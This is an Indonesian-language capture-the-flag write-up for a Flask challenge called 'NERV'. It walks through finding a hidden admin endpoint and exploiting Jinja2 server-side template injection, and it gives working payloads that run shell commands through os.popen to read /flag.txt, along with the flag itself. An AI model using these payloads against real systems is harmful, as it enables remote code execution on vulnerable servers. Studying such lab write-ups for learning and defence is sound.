# NERV - Writeup

## Analisis
Challenge ini mensimulasikan sistem internal NERV HQ. Setelah login menggunakan kredensial yang diberikan (`ikari : eva01`), kita diarahkan ke dashboard. Di dalam dashboard terdapat komentar HTML yang membocorkan endpoint admin yang dipindahkan: `/admin/reports`.

Endpoint `/admin/reports` memiliki fitur "Report Query Terminal" yang menggunakan "Template Engine". Input yang dimasukkan ke dalam textarea `query` dirender oleh server menggunakan `render_template_string` (berdasarkan perilaku yang diamati dan penggunaan Flask).

## Eksploitasi
1.  **Login**: Masuk ke aplikasi menggunakan `ikari : eva01`.
2.  **Discovery**: Temukan endpoint `/admin/reports` dari komentar di dashboard.
3.  **SSTI Testing**: Kirim payload `{{ 7 * 7 }}` ke `/admin/reports`. Hasilnya adalah `49`, mengonfirmasi adanya Server-Side Template Injection (SSTI) di Jinja2.
4.  **RCE**: Gunakan payload untuk mengeksekusi command sistem:
    `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}`
5.  **Read Flag**: Temukan file `/flag.txt` di root directory dan baca isinya:
    `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}`

Flag: `boroCTF{c0ngr@tulat!0nS*}`
